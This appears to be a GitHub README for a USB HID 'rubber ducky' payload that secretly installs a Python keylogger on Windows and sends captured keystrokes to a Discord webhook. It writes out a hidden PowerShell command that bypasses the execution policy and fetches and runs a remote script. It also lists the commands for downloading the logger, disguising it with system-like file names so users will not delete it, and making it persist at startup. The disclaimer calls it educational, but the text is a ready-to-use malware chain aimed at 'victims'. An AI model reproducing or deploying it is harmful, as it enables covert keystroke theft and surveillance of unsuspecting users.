THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES


# What it Does:

This payload executes a powershell command that downloads a python keylogger and runs it. This keylogger sends the keys pressed over discord using a webhook.

# Dependencies:

- Windows
- Python
- User is admin

# How to use:

## Pico-Ducky

If you have a [pico-ducky](https://github.com/dbisu/pico-ducky) which is what this payload was originally built for you just download the keylog-starter.dd and place it in the root of your pico directory. If you have a pico-ducky without wifi you need to rename it to ``payload.dd`` ``payload2.dd`` ``payload3.dd`` or ``payload4.dd`` read more here [here](https://github.com/dbisu/pico-ducky).

## Evilcrow cable-pro

Copy the contents of the ``keylog-starter-evilcrow.h`` to your ``payload.h`` file on your [EvilCrow Cable-pro](https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main)

## P4wnP1 A.L.O.A

I am working on a version for HID script

## Any other ducky script compatible tools

I havent tested any others but if you do please open up an issue and tell me how it went

# How it Works:

## The rubber ducky script
When the grabber.dd runs it opens a run dialoge with admin privileges and enters this script.

```powershell
powershell -W h -NonI -NoP -Ep bypass -c "$dc = '<your discord webhook here>'; irm https://shorturl.at/blvGV | iex"
```
This line opens a hidden windows with ``-W h`` a non interactive windows with ``-NonI`` no user profiles with ``NoP`` and bypasses the anti script execution policy using ``-Ep bypass``
Then it sets the ``$dc`` variable to your webhook.
And last but not least it downloads the ekylog-activator.ps1 script and executes it. The download link is shortened to fit inside the run dialoge. (I want to host my own site in the future where i can have my own directly short links)

(copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)

## The activator script
The script is used to configure the actual logger.

### Commands ran by the ps script:

1. We make a directory called ``system32`` in the C: drive using mkdir ``C:\system32\``. I decided to call it ``system32`` as many people would not want to delete the a folder named system32.
2. Next we enter the directory using ``cd C:\system32\``
3. Then we run `iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py` to download the keylogger and spit it out as sys-file.py (again to trick the user to not deleting the file)
4. After we have the logger we install the needed libraries ``py -m pip install discordwebhook pynput``
5. Then we create a file called startup.bat to run the keylogger on startup ``'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'``
6. To make it run at startup we need to copy it to the startup folder using this command ``cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'`` this is why we need the user to be admin so we can access the startup folder
7. Last but now least we use this command ``Python sys-file.py <your discord webhook here>"`` to run the keylogger the webhook is being ported as an anrgument and will later saved in a file on the victims computer.
